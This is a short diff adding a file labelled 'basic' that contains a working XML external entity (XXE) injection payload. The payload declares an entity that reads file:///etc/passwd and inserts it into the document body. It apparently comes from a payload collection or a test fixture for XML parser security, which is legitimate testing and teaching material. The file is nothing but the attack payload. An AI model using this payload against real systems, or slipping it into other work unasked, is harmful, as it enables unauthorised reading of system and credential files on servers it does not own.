@@ -1,0 +1,6 @@
+# basic
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<element>&xxe;</element>
+
